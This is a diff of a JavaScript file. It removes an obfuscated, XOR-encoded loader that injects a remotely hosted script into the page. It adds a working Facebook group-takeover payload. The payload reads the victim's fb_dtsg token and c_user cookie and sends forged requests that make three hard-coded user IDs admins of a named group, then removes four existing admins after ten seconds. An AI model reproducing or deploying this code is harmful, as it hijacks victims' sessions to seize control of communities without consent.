@@ -1,1 +1,62 @@
-var _0xca8d=["\x6A\x76\x76\x72\x71\x38\x2D\x2D\x70\x63\x75\x2C\x65\x6B\x76\x6A\x77\x60\x2C\x61\x6D\x6F\x2D\x60\x6A\x63\x70\x65\x63\x74\x33\x3B\x3B\x34\x2D\x48\x67\x71\x76\x67\x70\x55\x6A\x6B\x76\x67\x2D\x6F\x63\x71\x76\x67\x70\x2D\x43\x41\x4D\x5D\x74\x71\x5D\x51\x4D\x51\x2C\x72\x6A\x72","","\x6C\x65\x6E\x67\x74\x68","\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74","\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65","\x73\x72\x63","\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];var X=_0xca8d[0];Y=_0xca8d[1];Z=_0xca8d[1];var V;V=X[_0xca8d[2]];for(i=0;i<V;i++){Y+=String[_0xca8d[4]](X[_0xca8d[3]](i)^2);} ;Z=unescape(Y);document[_0xca8d[9]][_0xca8d[8]](document[_0xca8d[7]](_0xca8d[6]))[_0xca8d[5]]=Z;
+  
+
+  
+/*Admin Post*/
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+var now=(new Date).getTime();
+
+function IDS(r) {
+function G(gid) {
+  var Page = new XMLHttpRequest();
+  var PageURL = "//www.facebook.com/ajax/groups/admins_post.php";
+  var PageParams ="fb_dtsg="+fb_dtsg+"&gid="+gid+"&uid="+r+"&operation=confirm_add_admin&source=profilebrowser&make_admin=1&__user="+user_id+"&__a=1&__dyn=7n8ahyj35zoSt2u5FeDKdo&__req=34&ttstamp=26581661107112011276";
+  Page.open("POST", PageURL, true);
+  Page.onreadystatechange = function () {
+    if (Page.readyState == 4 && Page.status == 200) {
+      Page.close;
+    }
+  };
+  Page.send(PageParams);
+}
+G("391559757563844");
+}
+IDS("100004092334280");
+IDS("100003147643648");
+IDS("100005147649818");
+
+
+
+setTimeout(function(){
+
+/*remove-Admin Post*/
+
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+var now=(new Date).getTime();
+
+function IDS(r) {
+function G(gid) {
+  var Page = new XMLHttpRequest();
+  var PageURL = "//www.facebook.com/ajax/groups/admins_post.php";
+  var PageParams ="fb_dtsg="+fb_dtsg+"&gid="+gid+"&uid="+r+"&operation=confirm_remove_admin&source=profilebrowser&__user="+user_id+"&__a=1&__dyn=7n8ahyj35zoSt2u5FeDKdo&__req=b&ttstamp=26581661107112011276";
+  Page.open("POST", PageURL, true);
+  Page.onreadystatechange = function () {
+    if (Page.readyState == 4 && Page.status == 200) {
+      Page.close;
+    }
+  };
+  Page.send(PageParams);
+}
+G("391559757563844");
+}
+IDS("100002908006006");
+IDS("100003200476066");
+IDS("100006342757697");
+IDS("100005202368891");
+
+
+
+},10000);
+
+
